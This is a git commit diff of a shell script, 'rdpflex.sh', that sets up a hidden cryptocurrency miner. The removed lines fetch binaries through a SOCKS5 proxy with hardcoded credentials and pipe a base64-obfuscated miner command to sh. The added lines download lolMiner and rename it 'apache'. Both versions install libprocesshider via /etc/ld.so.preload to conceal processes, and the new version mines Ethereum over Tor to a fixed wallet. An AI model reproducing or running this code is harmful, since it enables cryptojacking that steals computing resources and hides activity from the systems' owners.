16819a2029ee23b759f54826e4684005ac5fd5ab
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-03 23:47:12 +0700

    Update rdpflex.sh

--- rdpflex.sh
+++ rdpflex.sh
@@ -1,47 +1,20 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+sudo dpkg-reconfigure --frontend noninteractive tzdata
+sudo apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+sudo service tor start
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
+tar -xf lolMiner_v1.51_Lin64.tar.gz
+cd 1.51
+mv lolMiner ../apache
+cd ..
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider
 make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuUkRQQGV0aC11cy13ZXN0LmZsZXhwb29sLmlvOjU1NTUgLS1sb2cgLS1leHRyYSAtLWxhdGVuY3kgLS1hbGwtc2hhcmVzIC0tc2hhcmVzLWRldGFpbCAtLXNob3ctbW9kZSAtLWxpc3QtbW9kZXMgLS1tb2RlPTk5 | sh >/dev/null 2>&1 >/dev/null 2>&1 >/dev/null 2>&1
+sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
+cd ..
+
+./apache --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.$(echo $(shuf -i 1-1000 -n 1)) --ethstratum ETHPROXY --socks5 127.0.0.1:9050 --dns-over-https 0
